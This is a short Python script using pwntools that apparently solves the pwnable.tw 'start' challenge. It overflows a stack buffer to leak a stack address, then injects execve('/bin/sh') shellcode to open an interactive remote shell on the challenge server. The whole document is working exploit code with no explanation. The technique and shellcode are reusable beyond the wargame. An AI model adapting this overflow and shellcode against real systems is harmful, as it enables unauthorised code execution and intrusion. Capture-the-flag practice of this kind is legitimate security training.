from pwn import *

p = remote('chall.pwnable.tw',10000)
#p = process("./start")

print(p.recvuntil(':'))
payload1 = b'A'*20 + p32(0x08048087) 

p.send(payload1)
#print(p.recv())

shellcode = b'\x83\xEC\x50\x31\xC0\x83\xC0\x0B\x31\xC9\x31\xD2\x52\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80'
payload2 = b'A'*20 + p32(u32(p.recv()[:4]) + 20) + shellcode

p.send(payload2)
p.interactive()